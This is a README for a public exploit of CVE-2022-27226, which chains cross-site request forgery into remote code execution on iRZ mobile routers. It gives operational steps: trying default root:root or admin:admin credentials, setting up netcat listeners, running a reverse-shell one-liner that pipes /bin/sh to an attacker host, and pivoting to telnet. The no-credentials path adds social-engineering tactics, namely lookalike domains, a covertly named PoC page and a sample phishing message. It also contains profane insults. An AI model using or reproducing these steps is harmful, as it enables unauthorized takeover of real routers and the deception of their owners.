# ez-iRZ
Exploit for CVE-2022-27226

Cross Site Request Forgery to Remote Code Execution in iRZ Mobile Routers

# Credits

<--Vulnerability Discovery-->

John Jackson

Chris Mack --- [https://github.com/0xHalcyon]

<--Exploit Development-->

Stephen Chavez --- [https://github.com/redragonx/]

Robert Willis

# Description 
A CSRF issue on iRZ Mobile Routers through 2022-03-16 allows a threat actor to create a crontab entry in the router administration panel.
The cronjob will consequently execute the entry on the threat actor's defined interval, leading to remote code execution, allowing
the threat actor to gain file system access. In addition, if the router's default credentials aren't rotated or a threat actor
discovers valid credentials, remote code execution can be achieved without user interaction.

# Pre-execution notes:
Starting two netcat listeners prior to attempting to catch a shell is pertinent, this is because the crontab, when run, will repeat the same
cronjob multiple times and your shell will die on the next cycle. You can't utilize nohup because the busybox env is fairly restrictive,
and alternatively you could modify the exploit with a different crontab entry interval, however the best way to defeat this without worrying
about crontab interval is two utilize multiple listeners for the first reverse shell catch. 

It was discovered that in most cases, the routers don't have the telnet port open externally - however, once gaining remote code execution, you
can utilize telnet to fix TTY *for the most part*. You need to have credentials to do so. If you're utilizing the full CSRF to RCE chain, we 
would recommend that you build a more comprehensive CSRF poc template that records the user's login event or the headers which may contain
the basic authorization header that is translated in the script. 

# Executing Post Authenticated Remote Code Execution Module (With Credentials)
Default credentials for these routers are typically root:root or admin:admin. If you have credentials, run:
```
python cve.py
```
Follow the instructions which are quite simple, then start two netcat listeners on two seperate ports.
```
nc -lvp 443
nc -lvp 5000
```
When you catch a reverse shell in the first listener, rerun the reverse shell one liner to gain a persistent shell:
```
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_ip} {second_nc_listener_port} >/tmp/f
```
Finally, if you have credentials (which you should if you're using this portion of the module) - attempt to pivot to the internally restricted telnet service:
```
telnet 0.0.0.0
```
"But what if telnet is exposed externally?" Then login to the fucking router with the credentials, dumbass. 

# Executing CSRF to RCE Module (No Credentials)
The instructions for this module are nearly the same as the Post Auth RCE instructions. With the major difference being that you don't have credentials.

First and foremost, to exploit efficiently, you have to understand how this works. CSRF requires user interaction, meaning that you'll need to social engineer
someone. There are two potentional scenarios: User is logged in when they click the proof of concept button, or user isn't logged in. If they are already
authenticated to the router, the POST request to make the cronjob will be sent to the API and the user will see a blank page. If they aren't logged in,
the user will get a basic authentication prompt - and conveniently enough, the basic auth popup will have the IP of the victim router, if they enter their
credentials it sends the POST request to the API. 

We recommend attempting to buy a similar domain if the victim router is hosted on a subdomain or finding a provider
with the same subnet ranges for servers if it's a high-priority target. Refining the CSRF PoC might be work it for a priority target. 

Run the script
```
python cve.py
```
Follow the instructions, in the script, it will then generate a csrf template for you. We recommend naming it something a little more covert.
```
mv poc.new.html index.html
```
Host the PoC on your server, preferably on the same port as the victim router.
```
python3 -m http.server 80
```
Take the link and send it to the victim, ensuring that you append the name of the PoC file to the end of the url:
```
Hi sweetie, can you login to router pwease:
http://your-ip-in-the-united-states-bcuz-you-didnt-take-my-advice/index.html
```

